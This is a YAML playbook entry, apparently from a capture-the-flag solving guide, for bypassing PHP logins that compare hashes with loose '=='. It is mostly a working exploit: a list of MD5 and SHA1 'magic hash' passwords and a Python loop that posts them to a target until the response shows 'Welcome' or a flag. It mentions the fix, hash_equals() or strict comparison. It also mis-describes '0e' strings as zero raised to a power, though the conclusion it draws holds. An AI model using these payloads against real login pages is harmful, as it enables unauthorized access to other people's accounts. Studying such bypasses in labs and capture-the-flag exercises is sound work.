name: php_type_juggling_magic_hash
category: web
tags: [php, type_juggling, magic_hash, md5, authentication_bypass]
indicators:
  - "PHP loose comparison (==) with hash values"
  - "MD5 hash starting with 0e followed by digits"
  - "Password comparison: md5($password) == $stored_hash"
  - "Hash value like 0e678703625362188185747119782643"

tricks:
  - name: "Step 1: Identify PHP type juggling vulnerability"
    when: "Found PHP code using == to compare hashes"
    how: "Check if stored hash starts with 0e and contains only digits after"
    payload: |
      # Vulnerable code pattern:
      # if (md5($_POST['password']) == $result_password)

      # Target hash: 0e678703625362188185747119782643
      # This is interpreted as 0^678703625362188185747119782643 = 0

  - name: "Step 2: Use Magic Hash"
    when: "Target hash starts with 0e"
    how: "Find a string whose MD5 also starts with 0e (all evaluate to 0)"
    payload: |
      # Magic Hash strings (MD5 = 0e...):
      QNKCDZO      -> 0e830400451993494058024219903391
      240610708    -> 0e462097431906509019562988736854
      s878926199a  -> 0e545993274517709034328855841020
      s155964671a  -> 0e342768416822451524974117254469
      s214587387a  -> 0e848240448830537924465865611904
      0e215962017  -> 0e291242476940776845150308577824

  - name: "Step 3: Exploit"
    when: "Have magic hash value"
    how: "Submit magic hash as password"
    payload: |
      import requests

      # Any of these will work
      passwords = ["QNKCDZO", "240610708", "s878926199a"]

      for pwd in passwords:
          resp = requests.post(target, data={"password": pwd})
          if "Welcome" in resp.text or "flag" in resp.text:
              print(f"Success with: {pwd}")
              break

  - name: "Understanding the vulnerability"
    when: "Need to explain the bug"
    how: "PHP loose comparison treats 0e strings as scientific notation"
    payload: |
      # In PHP:
      # "0e830400451993494058024219903391" == "0e678703625362188185747119782643"
      # Both are interpreted as 0 (zero to any power = 0)
      # So the comparison becomes: 0 == 0 -> true

      # Fix: Use strict comparison (===) or hash_equals()
      # if (hash_equals(md5($password), $stored_hash))

  - name: "Other magic hash types"
    when: "Different hash algorithms"
    how: "Magic hashes exist for other algorithms too"
    payload: |
      # SHA1 magic hashes:
      # 10932435112 -> 0e07766915004133176347055865026311692244

      # SHA256 magic hashes are harder to find
      # but the principle is the same
